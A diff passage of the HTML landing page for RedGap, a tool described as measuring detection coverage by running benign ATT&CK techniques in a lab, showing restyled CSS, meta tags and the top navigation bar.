@@ -4,211 +4,310 @@
 <meta charset="utf-8" />
 <meta name="viewport" content="width=device-width, initial-scale=1" />
 <title>RedGap — offense↔detection coverage</title>
-<meta name="description" content="RedGap runs benign MITRE ATT&CK techniques against its own disposable lab and deterministically decides — from logs and Sigma rules, no AI in the loop — whether each was detected or is a gap." />
+<link rel="icon" type="image/svg+xml" href="favicon.svg" />
+<meta name="theme-color" content="#06080c" media="(prefers-color-scheme: dark)" />
+<meta name="theme-color" content="#f4f6fa" media="(prefers-color-scheme: light)" />
+<meta name="description" content="RedGap runs benign MITRE ATT&CK techniques against its own disposable lab and deterministically decides — from logs and Sigma rules, no AI in the loop — whether each was detected or is a gap. Find the red." />
 <style>
   :root {
-    --ground: #0b0e14;
-    --surface: #121722;
-    --surface-2: #0f141d;
-    --border: #232b39;
-    --text: #d8dee9;
-    --muted: #9aa4b4;
-    --faint: #5c6676;
-    --green: #3fb950;
-    --green-dim: #1c3326;
-    --red: #f85149;
-    --red-dim: #3a1d1d;
-    --amber: #d29922;
-    --amber-dim: #352a12;
-    --accent: #f85149;
+    color-scheme: dark;
+    --bg: #06080c;
+    --bg-2: #0a0e15;
+    --panel: #0e1420;
+    --panel-2: #131b29;
+    --line: #1e2736;
+    --line-2: #2a3547;
+    --ink: #e8edf5;
+    --dim: #9aa6b8;
+    --faint: #66718420;
+    --faint-ink: #7d8798;
+    --green: #34d178;
+    --green-ink: #6ef0a6;
+    --green-bg: #0e2a1c;
+    --red: #ff4d55;
+    --red-ink: #ff8a8f;
+    --red-bg: #2c1015;
+    --amber: #f4b942;
+    --amber-bg: #2a2010;
+    --accent: #ff4d55;
+    --accent-solid: #dc2b34; /* darker red for solid fills so #fff text clears WCAG AA */
+    --eyebrow: #ff4d55;
     --mono: ui-monospace, "SF Mono", "JetBrains Mono", "Cascadia Code", Menlo, Consolas, monospace;
-    --sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Roboto, Helvetica, Arial, sans-serif;
-    --maxw: 1040px;
+    --sans: -apple-system, BlinkMacSystemFont, "Segoe UI", Inter, Roboto, Helvetica, Arial, sans-serif;
+    --maxw: 1120px;
+    --r: 14px;
   }
   @media (prefers-color-scheme: light) {
     :root {
-      --ground: #f6f8fb; --surface: #ffffff; --surface-2: #f0f3f8; --border: #e1e6ee;
-      --text: #10151d; --muted: #56606f; --faint: #97a1b0;
-      --green: #1a7f37; --green-dim: #e5f3ea; --red: #cf222e; --red-dim: #fbe9e9;
-      --amber: #9a6700; --amber-dim: #f6efdd; --accent: #cf222e;
+      color-scheme: light;
+      --bg: #f4f6fa; --bg-2: #eef1f7; --panel: #ffffff; --panel-2: #f5f7fb;
+      --line: #e3e8f0; --line-2: #d4dbe6; --ink: #0d131c; --dim: #4f5a6b; --faint-ink: #6c7686;
+      --green: #17914a; --green-ink: #0f7a3d; --green-bg: #e6f6ec;
+      --red: #dc2b34; --red-ink: #b91c24; --red-bg: #fdeced;
+      --amber: #875c00; --amber-bg: #f8efdb; --accent: #dc2b34;
+      --accent-solid: #dc2b34; --eyebrow: #b91c24;
     }
   }
   :root[data-theme="dark"] {
-    --ground: #0b0e14; --surface: #121722; --surface-2: #0f141d; --border: #232b39;
-    --text: #d8dee9; --muted: #9aa4b4; --faint: #5c6676;
-    --green: #3fb950; --green-dim: #1c3326; --red: #f85149; --red-dim: #3a1d1d;
-    --amber: #d29922; --amber-dim: #352a12; --accent: #f85149;
+    color-scheme: dark;
+    --bg: #06080c; --bg-2: #0a0e15; --panel: #0e1420; --panel-2: #131b29;
+    --line: #1e2736; --line-2: #2a3547; --ink: #e8edf5; --dim: #9aa6b8; --faint-ink: #7d8798;
+    --green: #34d178; --green-ink: #6ef0a6; --green-bg: #0e2a1c;
+    --red: #ff4d55; --red-ink: #ff8a8f; --red-bg: #2c1015;
+    --amber: #f4b942; --amber-bg: #2a2010; --accent: #ff4d55;
+    --accent-solid: #dc2b34; --eyebrow: #ff4d55;
   }
   :root[data-theme="light"] {
-    --ground: #f6f8fb; --surface: #ffffff; --surface-2: #f0f3f8; --border: #e1e6ee;
-    --text: #10151d; --muted: #56606f; --faint: #97a1b0;
-    --green: #1a7f37; --green-dim: #e5f3ea; --red: #cf222e; --red-dim: #fbe9e9;
-    --amber: #9a6700; --amber-dim: #f6efdd; --accent: #cf222e;
+    color-scheme: light;
+    --bg: #f4f6fa; --bg-2: #eef1f7; --panel: #ffffff; --panel-2: #f5f7fb;
+    --line: #e3e8f0; --line-2: #d4dbe6; --ink: #0d131c; --dim: #4f5a6b; --faint-ink: #6c7686;
+    --green: #17914a; --green-ink: #0f7a3d; --green-bg: #e6f6ec;
+    --red: #dc2b34; --red-ink: #b91c24; --red-bg: #fdeced;
+    --amber: #875c00; --amber-bg: #f8efdb; --accent: #dc2b34;
+      --accent-solid: #dc2b34; --eyebrow: #b91c24;
   }
   * { box-sizing: border-box; }
-  html { -webkit-text-size-adjust: 100%; }
+  html { -webkit-text-size-adjust: 100%; scroll-behavior: smooth; scroll-padding-top: 70px; }
+  @media (prefers-reduced-motion: reduce) { html { scroll-behavior: auto; } }
   body {
-    margin: 0; background: var(--ground); color: var(--text);
-    font-family: var(--sans); line-height: 1.6;
-    font-size: 16px; letter-spacing: 0.01em;
+    margin: 0; background: var(--bg); color: var(--ink);
+    font-family: var(--sans); line-height: 1.62; font-size: 16.5px; letter-spacing: 0.006em;
+    -webkit-font-smoothing: antialiased;
   }
-  .wrap { max-width: var(--maxw); margin: 0 auto; padding: 0 22px; }
+  .wrap { max-width: var(--maxw); margin: 0 auto; padding: 0 24px; }
   a { color: inherit; text-decoration: none; }
-  a.link { color: var(--text); border-bottom: 1px solid var(--faint); }
-  a.link:hover { border-color: var(--accent); color: var(--accent); }
-  h1, h2, h3 { font-family: var(--mono); font-weight: 600; letter-spacing: -0.01em; line-height: 1.2; }
+  a.ln { color: var(--dim); border-bottom: 1px solid var(--line-2); transition: color .15s, border-color .15s; }
+  a.ln:hover { color: var(--accent); border-color: var(--accent); }
+  h1, h2, h3 { font-weight: 700; letter-spacing: -0.02em; line-height: 1.08; margin: 0; text-wrap: balance; }
   code, .mono { font-family: var(--mono); }
-  .eyebrow {
-    font-family: var(--mono); font-size: 12px; letter-spacing: 0.14em;
-    text-transform: uppercase; color: var(--muted);
-  }
-  .muted { color: var(--muted); }
+  .dim { color: var(--dim); }
+  .eyebrow { font-family: var(--mono); font-size: 12px; letter-spacing: 0.16em; text-transform: uppercase; color: var(--eyebrow); font-weight: 600; }
+  .gapword { color: var(--accent); }
 
   /* Top bar */
-  .topbar {
-    position: sticky; top: 0; z-index: 20; backdrop-filter: blur(10px);
-    background: color-mix(in srgb, var(--ground) 82%, transparent);
-    border-bottom: 1px solid var(--border);
-  }
-  .topbar .wrap { display: flex; align-items: center; gap: 16px; height: 56px; }
-  .brand { display: flex; align-items: center; gap: 10px; font-family: var(--mono); font-weight: 600; }
-  .brand .logo { display: grid; grid-template-columns: repeat(3, 6px); grid-auto-rows: 6px; gap: 2px; }
-  .brand .logo i { background: var(--green); border-radius: 1px; }
-  .brand .logo i.gap { background: var(--accent); box-shadow: 0 0 8px var(--accent); }
-  .topnav { margin-left: auto; display: flex; gap: 18px; align-items: center; font-size: 14px; }
-  .topnav a { color: var(--muted); }
-  .topnav a:hover { color: var(--text); }
-  .theme-btn {
-    font-family: var(--mono); font-size: 12px; color: var(--muted); cursor: pointer;
-    background: var(--surface); border: 1px solid var(--border); border-radius: 6px; padding: 5px 9px;
-  }
-  .theme-btn:hover { color: var(--text); border-color: var(--faint); }
-  @media (max-width: 680px) { .topnav a.hide-sm { display: none; } }
+  .topbar { position: sticky; top: 0; z-index: 40; backdrop-filter: blur(14px);
+    background: color-mix(in srgb, var(--bg) 78%, transparent); border-bottom: 1px solid var(--line); }
+  .topbar .wrap { display: flex; align-items: center; gap: 16px; height: 62px; }
+  .brand { display: flex; align-items: center; gap: 11px; font-family: var(--mono); font-weight: 700; font-size: 16px; letter-spacing: -0.01em; }
+  .logo { display: grid; grid-template-columns: repeat(3, 7px); grid-auto-rows: 7px; gap: 2.5px; }
+  .logo i { background: var(--green); border-radius: 1.5px; }
+  .logo i.g { background: var(--accent); box-shadow: 0 0 10px var(--accent); }
+  .topnav { margin-left: auto; display: flex; gap: 22px; align-items: center; font-size: 14.5px; }
+  .topnav a { color: var(--dim); transition: color .15s; }
+  .topnav a:hover { color: var(--ink); }
+  .theme-btn { font-family: var(--mono); font-size: 12px; color: var(--dim); cursor: pointer;
+    background: var(--panel); border: 1px solid var(--line); border-radius: 8px; padding: 6px 10px; }
+  .theme-btn:hover { color: var(--ink); border-color: var(--line-2); }
+  @media (max-width: 760px) { .topnav a.hs { display: none; } }
 
   /* Hero */
-  .hero { padding: 74px 0 48px; }
-  .hero h1 { font-size: clamp(38px, 7vw, 68px); margin: 0 0 6px; letter-spacing: -0.02em; }
-  .hero h1 .gap { color: var(--accent); }
-  .hero .tag { font-size: clamp(18px, 2.6vw, 23px); color: var(--text); margin: 0 0 20px; max-width: 30ch; }
-  .hero .lede { font-size: 17px; color: var(--muted); max-width: 62ch; margin: 0 0 28px; }
-  .hero .lede b { color: var(--text); font-weight: 600; }
-  .cta { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; }
-  .btn {
-    font-family: var(--mono); font-size: 14px; padding: 10px 15px; border-radius: 8px;
-    border: 1px solid var(--border); background: var(--surface); color: var(--text);
-    display: inline-flex; align-items: center; gap: 8px; cursor: pointer;
-  }
-  .btn.primary { background: var(--accent); border-color: var(--accent); color: #fff; }
-  :root[data-theme="light"] .btn.primary { color: #fff; }
-  .btn:hover { border-color: var(--faint); }
-  .btn.primary:hover { filter: brightness(1.08); border-color: var(--accent); }
+  .hero { position: relative; overflow: hidden; border-bottom: 1px solid var(--line); }
+  .hero::before { content: ""; position: absolute; inset: 0; z-index: 0; pointer-events: none;
+    background:
+      radial-gradient(60% 55% at 82% 12%, color-mix(in srgb, var(--accent) 22%, transparent), transparent 70%),
+      radial-gradient(50% 45% at 8% 90%, color-mix(in srgb, var(--green) 12%, transparent), transparent 70%); }
+  .hero .wrap { position: relative; z-index: 1; display: grid; grid-template-columns: 1.05fr 0.95fr;
+    gap: 44px; align-items: center; padding: 66px 24px 60px; }
+  @media (max-width: 900px) { .hero .wrap { grid-template-columns: 1fr; gap: 30px; padding: 44px 24px 46px; } }
+  .hero h1 { font-size: clamp(40px, 6.4vw, 74px); margin: 12px 0 8px; letter-spacing: -0.035em; }
+  .hero .tag { font-size: clamp(17px, 2vw, 21px); color: var(--ink); font-weight: 500; margin: 0 0 16px; max-width: 24ch; }
+  .hero .lede { font-size: 16px; color: var(--dim); max-width: 52ch; margin: 0 0 26px; }
+  .hero .lede b { color: var(--ink); font-weight: 600; }
+  .cta { display: flex; flex-wrap: wrap; gap: 11px; align-items: center; }
+  .btn { font-family: var(--mono); font-size: 14px; padding: 11px 16px; border-radius: 10px;
+    border: 1px solid var(--line-2); background: var(--panel); color: var(--ink);
+    display: inline-flex; align-items: center; gap: 8px; cursor: pointer; transition: border-color .15s, filter .15s, transform .05s; }
+  .btn:hover { border-color: var(--faint-ink); }
+  .btn:active { transform: translateY(1px); }
+  .btn.primary { background: var(--accent-solid); border-color: var(--accent-solid); color: #fff; font-weight: 600; box-shadow: 0 6px 24px -8px var(--accent); }
+  .btn.primary:hover { filter: brightness(1.08); }
 
-  /* Stat strip */
-  .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; margin: 40px 0 0; }
-  @media (max-width: 680px) { .stats { grid-template-columns: repeat(2, 1fr); } }
-  .stat { background: var(--surface); border: 1px solid var(--border); border-radius: 12px; padding: 16px 18px; }
-  .stat .n { font-family: var(--mono); font-size: 30px; font-weight: 600; line-height: 1; }
-  .stat .n.g { color: var(--green); }
-  .stat .n.r { color: var(--red); }
-  .stat .l { font-size: 12.5px; color: var(--muted); margin-top: 7px; }
+  /* Terminal */
+  .term { background: linear-gradient(180deg, var(--panel), var(--bg-2)); border: 1px solid var(--line-2);
+    border-radius: var(--r); box-shadow: 0 24px 60px -30px #000a, 0 0 0 1px #ffffff08 inset; overflow: hidden; }
+  .term .bar { display: flex; align-items: center; gap: 7px; padding: 11px 14px; border-bottom: 1px solid var(--line); }
+  .term .bar i { width: 11px; height: 11px; border-radius: 50%; background: var(--line-2); }
+  .term .bar i:nth-child(1) { background: #ff5f57; } .term .bar i:nth-child(2) { background: #febc2e; } .term .bar i:nth-child(3) { background: #28c840; }
+  .term .bar span { margin-left: 8px; font-family: var(--mono); font-size: 12px; color: var(--faint-ink); }
+  .term pre { margin: 0; padding: 16px 18px; font-family: var(--mono); font-size: 13px; line-height: 1.65;
+    min-height: 288px; white-space: pre-wrap; word-break: break-word; color: var(--ink); }
+  .term .p { color: var(--accent); } .term .c { color: var(--faint-ink); }
+  .term .ok { color: var(--green-ink); } .term .bad { color: var(--red-ink); } .term .warn { color: var(--amber); }
+  .term .cur { display: inline-block; width: 8px; height: 15px; background: var(--green); vertical-align: -2px; animation: blink 1.05s step-end infinite; }
+  @keyframes blink { 50% { opacity: 0; } }
+  @media (prefers-reduced-motion: reduce) { .term .cur { animation: none; } }
 
-  section { padding: 52px 0; border-top: 1px solid var(--border); }
-  section h2 { font-size: clamp(24px, 4vw, 32px); margin: 8px 0 8px; }
-  section .sub { color: var(--muted); max-width: 66ch; margin: 0 0 26px; }
+  /* Stat rail */
+  .stats { display: grid; grid-template-columns: repeat(4, 1fr); gap: 1px; background: var(--line);
+    border: 1px solid var(--line); border-radius: var(--r); overflow: hidden; margin-top: 0; }
+  /* Pull the stat band up to the hero content: by default the grid wrap and the stat wrap
+     stack 60px + 66px + 34px of padding between them, floating the stats far too low. */
+  .hero .wrap:first-of-type { padding-bottom: 20px; }
+  .hero .statwrap { padding-top: 20px; }
+  @media (max-width: 620px) { .stats { grid-template-columns: repeat(2, 1fr); } }
+  .stat { background: var(--panel); padding: 18px 20px; }
+  .stat .n { font-family: var(--mono); font-size: 28px; font-weight: 700; line-height: 1; letter-spacing: -0.02em; }
+  .stat .n.g { color: var(--green); } .stat .n.r { color: var(--red); }
+  .stat .l { font-size: 12.5px; color: var(--dim); margin-top: 8px; }
 
-  /* Trust boundary band */
-  .flow { display: grid; grid-template-columns: 1fr; gap: 14px; }
-  .flowrow { display: flex; flex-wrap: wrap; align-items: stretch; gap: 10px; }
-  .node {
-    flex: 1 1 150px; background: var(--surface); border: 1px solid var(--border);
-    border-radius: 10px; padding: 14px; min-width: 130px;
-  }
-  .node .k { font-family: var(--mono); font-size: 13px; font-weight: 600; }
-  .node .d { font-size: 12.5px; color: var(--muted); margin-top: 5px; }
-  .node.engine { border-color: var(--green); background: var(--green-dim); }
-  .node.engine .k { color: var(--green); }
-  .node.llm { border: 1px dashed var(--accent); background: transparent; }
-  .node.llm .k { color: var(--accent); }
-  .arrowline { text-align: center; color: var(--muted); font-family: var(--mono); font-size: 12px; }
+  section { padding: 66px 0; border-bottom: 1px solid var(--line); }
+  section h2 { font-size: clamp(26px, 3.6vw, 38px); margin: 10px 0 10px; }
+  section .sub { color: var(--dim); max-width: 64ch; margin: 0 0 30px; font-size: 16px; }
 
   /* Heatmap */
-  .legend { display: flex; flex-wrap: wrap; gap: 16px; margin: 0 0 18px; font-size: 13px; color: var(--muted); }
-  .legend span { display: inline-flex; align-items: center; gap: 7px; }
-  .swatch { width: 12px; height: 12px; border-radius: 3px; display: inline-block; border: 1px solid var(--border); }
-  .swatch.g { background: var(--green); } .swatch.r { background: var(--red); }
-  .swatch.a { background: var(--amber); } .swatch.u { background: var(--surface-2); }
-  .matrix-scroll { overflow-x: auto; padding-bottom: 8px; border-radius: 12px; }
-  .matrix { display: grid; grid-auto-flow: column; grid-auto-columns: minmax(112px, 1fr); gap: 8px; min-width: 900px; }
-  .tcol { background: var(--surface-2); border: 1px solid var(--border); border-radius: 10px; padding: 9px 8px; }
-  .tcol h4 {
-    font-family: var(--mono); font-size: 10.5px; letter-spacing: 0.03em; text-transform: uppercase;
-    color: var(--muted); margin: 0 0 9px; line-height: 1.3; min-height: 26px; font-weight: 600;
-  }
-  .cell {
-    border-radius: 7px; padding: 8px; margin-bottom: 6px; border: 1px solid var(--border);
-    background: var(--surface); font-size: 11px;
-  }
-  .cell .id { font-family: var(--mono); font-weight: 600; font-size: 11.5px; }
-  .cell .nm { color: var(--muted); font-size: 10.5px; margin-top: 3px; line-height: 1.3; }
-  .cell.det { background: var(--green-dim); border-color: var(--green); }
-  .cell.det .id { color: var(--green); }
-  .cell.gap-rule { background: var(--red-dim); border-color: var(--red); }
-  .cell.gap-rule .id { color: var(--red); }
-  .cell.gap-base { background: var(--amber-dim); border-color: var(--amber); }
+  .legend { display: flex; flex-wrap: wrap; gap: 18px; margin: 0 0 18px; font-size: 13.5px; color: var(--dim); }
+  .legend span { display: inline-flex; align-items: center; gap: 8px; }
+  .sw { width: 13px; height: 13px; border-radius: 4px; display: inline-block; border: 1px solid var(--line-2); }
+  .sw.g { background: var(--green); box-shadow: 0 0 8px -1px var(--green); }
+  .sw.r { background: var(--red); box-shadow: 0 0 9px -1px var(--red); }
+  .sw.a { background: var(--amber); } .sw.u { background: var(--panel-2); }
+  .toolbar { display: flex; flex-wrap: wrap; gap: 12px; align-items: center; margin-bottom: 20px; }
+  .toggle { display: inline-flex; border: 1px solid var(--line-2); border-radius: 999px; overflow: hidden; }
+  .toggle button { font-family: var(--mono); font-size: 13px; padding: 8px 15px; background: var(--panel); color: var(--dim); border: none; cursor: pointer; transition: background .15s, color .15s; }
+  .toggle button.on { background: var(--accent-solid); color: #fff; }
+  .matrix-scroll { overflow-x: auto; padding-bottom: 14px; scroll-behavior: smooth;
+    scroll-snap-type: x proximity;
+    scrollbar-width: thin; scrollbar-color: var(--line-2) transparent; }
+  .matrix-scroll::-webkit-scrollbar { height: 10px; }
+  .matrix-scroll::-webkit-scrollbar-track { background: var(--panel-2); border-radius: 999px; }
+  .matrix-scroll::-webkit-scrollbar-thumb { background: var(--line-2); border-radius: 999px; border: 2px solid var(--bg); }
+  .matrix-scroll::-webkit-scrollbar-thumb:hover { background: var(--faint-ink); }
+  .matrix { display: grid; grid-auto-flow: column; grid-auto-columns: var(--col-w, 150px); gap: 10px; width: max-content; }
+  .tcol { background: var(--panel-2); border: 1px solid var(--line); border-radius: 12px; padding: 11px 9px; scroll-snap-align: start; }
+  .tcol h4 { font-family: var(--mono); font-size: 10.5px; letter-spacing: 0.05em; text-transform: uppercase;
+    color: var(--dim); margin: 0 0 11px; line-height: 1.35; min-height: 28px; font-weight: 600; }
+  .cell { border-radius: 9px; padding: 9px 10px; margin-bottom: 7px; border: 1px solid var(--line-2); background: var(--panel); font-size: 11px; transition: transform .1s; }
+  .cell:hover { transform: translateY(-1px); }
+  .cell .id { font-family: var(--mono); font-weight: 700; font-size: 11.5px; }
+  .cell .nm { color: var(--dim); font-size: 10.5px; margin-top: 3px; line-height: 1.32; }
+  .cell.det { background: var(--green-bg); border-color: color-mix(in srgb, var(--green) 55%, var(--line)); }
+  .cell.det .id { color: var(--green-ink); }
+  .cell.gap-rule { background: var(--red-bg); border-color: var(--red); box-shadow: 0 0 16px -6px var(--red); }
+  .cell.gap-rule .id { color: var(--red-ink); }
+  .cell.gap-base { background: var(--amber-bg); border-color: color-mix(in srgb, var(--amber) 55%, var(--line)); }
   .cell.gap-base .id { color: var(--amber); }
-  .tcol .empty { color: var(--muted); font-family: var(--mono); font-size: 11px; text-align: center; padding: 8px 0; }
+  .tcol .empty { color: var(--faint-ink); font-family: var(--mono); font-size: 12px; text-align: center; padding: 10px 0; }
 
   /* Table */
-  .tbl-scroll { overflow-x: auto; border: 1px solid var(--border); border-radius: 12px; }
-  table { border-collapse: collapse; width: 100%; min-width: 640px; font-size: 14px; }
-  th, td { text-align: left; padding: 12px 14px; border-bottom: 1px solid var(--border); vertical-align: top; }
-  th { font-family: var(--mono); font-size: 11px; letter-spacing: 0.06em; text-transform: uppercase; color: var(--muted); font-weight: 600; }
+  .tbl-scroll { overflow-x: auto; border: 1px solid var(--line); border-radius: 12px; margin-top: 26px; }
+  table { border-collapse: collapse; width: 100%; min-width: 680px; font-size: 14px; }
+  th, td { text-align: left; padding: 12px 15px; border-bottom: 1px solid var(--line); vertical-align: top; }
+  th { font-family: var(--mono); font-size: 11px; letter-spacing: 0.06em; text-transform: uppercase; color: var(--dim); font-weight: 600; }
   tr:last-child td { border-bottom: none; }
-  td .tid { font-family: var(--mono); font-weight: 600; }
-  td .rule { font-family: var(--mono); font-size: 12px; color: var(--muted); }
-  .pill { font-family: var(--mono); font-size: 11.5px; padding: 3px 9px; border-radius: 999px; white-space: nowrap; display: inline-block; }
-  .pill.det { color: var(--green); background: var(--green-dim); border: 1px solid var(--green); }
-  .pill.rule { color: var(--red); background: var(--red-dim); border: 1px solid var(--red); }
-  .pill.base { color: var(--amber); background: var(--amber-dim); border: 1px solid var(--amber); }
+  td .tid { font-family: var(--mono); font-weight: 700; }
+  td .rule { font-family: var(--mono); font-size: 12px; color: var(--dim); }
+  .pill { font-family: var(--mono); font-size: 11.5px; padding: 3px 10px; border-radius: 999px; white-space: nowrap; display: inline-block; }
+  .pill.det { color: var(--green-ink); background: var(--green-bg); border: 1px solid color-mix(in srgb, var(--green) 55%, var(--line)); }
+  .pill.rule { color: var(--red-ink); background: var(--red-bg); border: 1px solid var(--red); }
+  .pill.base { color: var(--amber); background: var(--amber-bg); border: 1px solid color-mix(in srgb, var(--amber) 55%, var(--line)); }
 
-  .toggle { display: inline-flex; border: 1px solid var(--border); border-radius: 999px; overflow: hidden; margin-bottom: 22px; }
-  .toggle button { font-family: var(--mono); font-size: 13px; padding: 8px 16px; background: var(--surface); color: var(--muted); border: none; cursor: pointer; }
-  .toggle button.on { background: var(--accent); color: #fff; }
+  .upnote { font-size: 13px; color: var(--dim); max-width: 60ch; }
+  .upnote b { color: var(--ink); }
 
-  /* Code blocks */
-  .code {
-    background: var(--surface-2); border: 1px solid var(--border); border-radius: 10px;
-    padding: 14px 16px; font-family: var(--mono); font-size: 13.5px; overflow-x: auto; margin: 0 0 12px;
-    color: var(--text);
-  }
-  .code .c { color: var(--muted); }
-  .code .p { color: var(--accent); }
-  .grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 22px; }
-  @media (max-width: 720px) { .grid2 { grid-template-columns: 1fr; } }
+  /* Steps (practical) */
+  .steps { display: grid; grid-template-columns: repeat(3, 1fr); gap: 16px; }
+  @media (max-width: 820px) { .steps { grid-template-columns: 1fr; } }
+  .step { background: var(--panel); border: 1px solid var(--line); border-radius: 12px; padding: 20px; display: flex; flex-direction: column; }
+  .step .num { font-family: var(--mono); font-size: 12px; color: var(--accent); font-weight: 700; letter-spacing: 0.08em; }
+  .step h3 { font-size: 17px; margin: 10px 0 8px; }
+  .step p { color: var(--dim); font-size: 14px; margin: 0 0 12px; }
+  .step .code { margin: 16px 0 0; margin-top: auto; }
 
-  footer { border-top: 1px solid var(--border); padding: 40px 0 60px; color: var(--muted); font-size: 14px; }
-  footer .row { display: flex; flex-wrap: wrap; gap: 18px 26px; align-items: center; }
-  footer .fine { margin-top: 18px; font-size: 12.5px; color: var(--muted); max-width: 70ch; }
-  .reveal { opacity: 0; transform: translateY(10px); transition: opacity .5s ease, transform .5s ease; }
+  /* Flow / trust */
+  .flow { display: grid; gap: 14px; }
+  .flowrow { display: flex; flex-wrap: wrap; align-items: stretch; gap: 11px; }
+  .node { flex: 1 1 150px; background: var(--panel); border: 1px solid var(--line); border-radius: 11px; padding: 15px; min-width: 132px; }
+  .node .k { font-family: var(--mono); font-size: 13px; font-weight: 700; }
+  .node .d { font-size: 12.5px; color: var(--dim); margin-top: 5px; }
+  .node.engine { border-color: var(--green); background: var(--green-bg); }
+  .node.engine .k { color: var(--green-ink); }
+  .node.llm { border: 1px dashed var(--accent); background: transparent; max-width: 540px; margin: 0 auto 2px; }
+  .node.llm .k { color: var(--accent); }
+  .arrowline { text-align: center; color: var(--dim); font-family: var(--mono); font-size: 12px; }
+
+  .code { background: var(--bg-2); border: 1px solid var(--line); border-radius: 11px; padding: 15px 17px;
+    font-family: var(--mono); font-size: 13.5px; overflow-x: auto; margin: 0 0 12px; color: var(--ink); line-height: 1.7; }
+  .code .c { color: var(--faint-ink); } .code .p { color: var(--accent); }
+  .grid2 { display: grid; grid-template-columns: 1fr 1fr; gap: 24px; }
+  @media (max-width: 760px) { .grid2 { grid-template-columns: 1fr; } }
+
+  footer { padding: 44px 0 66px; color: var(--dim); font-size: 14px; }
+  footer .frow { display: flex; flex-wrap: wrap; gap: 16px 26px; align-items: center; }
+  footer .fine { margin-top: 20px; font-size: 12.5px; color: var(--faint-ink); max-width: 78ch; line-height: 1.6; }
+
+  .reveal { opacity: 0; transform: translateY(14px); transition: opacity .6s ease, transform .6s ease; }
   .reveal.in { opacity: 1; transform: none; }
   @media (prefers-reduced-motion: reduce) { .reveal { opacity: 1; transform: none; transition: none; } }
+  :focus-visible { outline: 2px solid var(--accent); outline-offset: 2px; border-radius: 4px; }
+  .sr-only { position: absolute; width: 1px; height: 1px; padding: 0; margin: -1px; overflow: hidden;
+    clip: rect(0, 0, 0, 0); clip-path: inset(50%); white-space: nowrap; border: 0; }
+  label:focus-within { outline: 2px solid var(--accent); outline-offset: 2px; }
+
+  /* Clickable coverage cells / rows */
+  .cell[data-id], tr[data-id] { cursor: pointer; }
+  tr[data-id]:hover td { background: var(--panel-2); }
+  .cell[data-id]:hover { transform: translateY(-1px); }
+
+  /* Detection Playground drawer */
+  .dback { position: fixed; inset: 0; background: #000a; backdrop-filter: blur(3px);
+    opacity: 0; pointer-events: none; transition: opacity .2s; z-index: 60; }
+  .dback.open { opacity: 1; pointer-events: auto; }
+  .drawer { position: fixed; top: 0; right: 0; height: 100%; width: min(580px, 95vw);
+    background: var(--panel); border-left: 1px solid var(--line-2);
+    box-shadow: -30px 0 70px -30px #000c; transform: translateX(101%);
+    transition: transform .26s cubic-bezier(.4, 0, .2, 1); z-index: 61;
+    overflow-y: auto; overscroll-behavior: contain; }
+  .drawer.open { transform: none; }
+  @media (prefers-reduced-motion: reduce) { .drawer, .dback { transition: none; } }
+  .dhead { position: sticky; top: 0; z-index: 1; background: var(--panel);
+    border-bottom: 1px solid var(--line); padding: 18px 22px; display: flex; align-items: flex-start; gap: 12px; }
+  .dhead h3 { font-size: 19px; margin: 6px 0 0; letter-spacing: -0.01em; }
+  .dhead .x { margin-left: auto; font-family: var(--mono); font-size: 15px; line-height: 1;
+    color: var(--dim); cursor: pointer; background: var(--panel-2); border: 1px solid var(--line);
+    border-radius: 8px; padding: 8px 11px; }
+  .dhead .x:hover { color: var(--ink); border-color: var(--line-2); }
+  .dbody { padding: 8px 22px 46px; }
+  .dbody .blk { margin-top: 22px; }
+  .dbody .lbl { font-family: var(--mono); font-size: 10.5px; letter-spacing: 0.12em;
+    text-transform: uppercase; color: var(--dim); margin-bottom: 9px; font-weight: 600; }
+  .dbody .cmd { font-family: var(--mono); font-size: 13px; background: var(--bg-2);
+    border: 1px solid var(--line); border-radius: 10px; padding: 12px 14px; overflow-x: auto;
+    line-height: 1.6; white-space: pre-wrap; word-break: break-word; }
+  .dbody .cmd .p { color: var(--accent); }
+  .tele { display: grid; gap: 7px; }
+  .tele .ev { background: var(--bg-2); border: 1px solid var(--line); border-radius: 9px;
+    padding: 9px 12px; font-family: var(--mono); font-size: 12px; overflow-x: auto; }
+  .tele .ev .img { color: var(--faint-ink); }
+  .tele .ev .cl { color: var(--ink); }
+  .tele .ev .mk { color: var(--green-ink); background: color-mix(in srgb, var(--green) 18%, transparent);
+    border-radius: 3px; padding: 0 2px; }
+  .kv { display: grid; gap: 6px; }
+  .kv .row { display: flex; gap: 10px; font-family: var(--mono); font-size: 12.5px; align-items: baseline; }
+  .kv .row .k { color: var(--green-ink); min-width: 118px; }
+  .kv .row .v { color: var(--ink); word-break: break-word; }
+  .whybox { border-radius: 10px; padding: 13px 15px; font-size: 14px; line-height: 1.55; }
+  .whybox.det { background: var(--green-bg); border: 1px solid color-mix(in srgb, var(--green) 45%, var(--line)); color: var(--green-ink); }
+  .whybox.rule { background: var(--red-bg); border: 1px solid var(--red); color: var(--red-ink); }
+  .whybox.base { background: var(--amber-bg); border: 1px solid color-mix(in srgb, var(--amber) 45%, var(--line)); color: var(--amber); }
+  .drow { display: flex; flex-wrap: wrap; gap: 10px; align-items: center; margin-top: 12px; }
+  .drow .tac { font-family: var(--mono); font-size: 11px; color: var(--dim); border: 1px solid var(--line);
+    border-radius: 999px; padding: 3px 9px; }
 </style>
 </head>
 <body>
 
 <div class="topbar">
   <div class="wrap">
-    <a class="brand" href="#top">
-      <span class="logo" aria-hidden="true">
-        <i></i><i></i><i></i><i></i><i class="gap"></i><i></i><i></i><i></i><i></i>
-      </span>
+    <a class="brand" href="#top" aria-label="RedGap home">
+      <span class="logo" aria-hidden="true"><i></i><i></i><i></i><i></i><i class="g"></i><i></i><i></i><i></i><i></i></span>
       RedGap
     </a>
-    <nav class="topnav">
-      <a href="#coverage" class="hide-sm">Coverage</a>
-      <a href="#trust" class="hide-sm">Trust boundary</a>
+    <nav class="topnav" aria-label="Primary">
+      <a href="#coverage" class="hs">Coverage</a>
+      <a href="#use" class="hs">How to use</a>
+      <a href="#trust" class="hs">Trust boundary</a>
       <a href="#run">Run it</a>
-      <a href="https://github.com/befnoz/redgap" target="_blank" rel="noopener">GitHub</a>
+      <a href="https://github.com/befnoz/redgap" target="_blank" rel="noopener">GitHub ↗</a>
       <button class="theme-btn" id="themeBtn" type="button" aria-label="Toggle dark/light theme" aria-pressed="false" title="Toggle theme">◑ theme</button>
     </nav>
   </div>
